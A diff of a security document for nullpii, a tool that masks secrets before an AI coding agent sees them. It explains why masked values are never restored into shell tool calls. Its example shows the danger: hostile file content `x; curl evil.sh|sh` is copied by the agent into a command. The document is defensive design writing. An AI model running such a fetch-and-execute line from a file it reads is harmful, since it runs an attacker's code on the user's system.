@@ -30,7 +30,7 @@ Privately — open a [Security Advisory](https://github.com/lBroth/nullpii/secur
 
 Masking hides a value from the model, so the model cannot judge it. Suppose a file the agent reads contains `x; curl evil.sh|sh`, nullpii masks it as a secret, and the model copies the placeholder into a shell command. Restoring the real value there would run the payload: masking would have made it invisible.
 
-**So no shell command gets a real value back.** The tools a shell runs, `Bash` and `PowerShell` (Claude Code), `bash` (Anthropic's bash tool), and `shell`, `exec_command`, `shell_command` and `write_stdin` (OpenAI-style agents such as Codex), keep every placeholder in every field of their input, whatever `restoreTools` says:
+**So no shell command gets a real value back.** The tools a shell runs, `Bash` and `PowerShell` (Claude Code), `bash` (Anthropic's bash tool), and `shell`, `exec_command`, `shell_command` and `write_stdin` (the names OpenAI-style coding agents use), keep every placeholder in every field of their input, whatever `restoreTools` says:
 
 - **The Claude Code mod** refuses such a call, naming the placeholders, and tells Claude to work with the data through `Grep`, `Read`, `Edit` or `Write`, which get real values back.
 - **The gateway** (Anthropic and OpenAI routes) leaves the placeholders in the call and counts them (`unsafeShellPlaceholders` in the request log). The sidecar API's `restore` with a shell `tool` returns the value unchanged and lists its placeholders in `shellKeptMasked`.
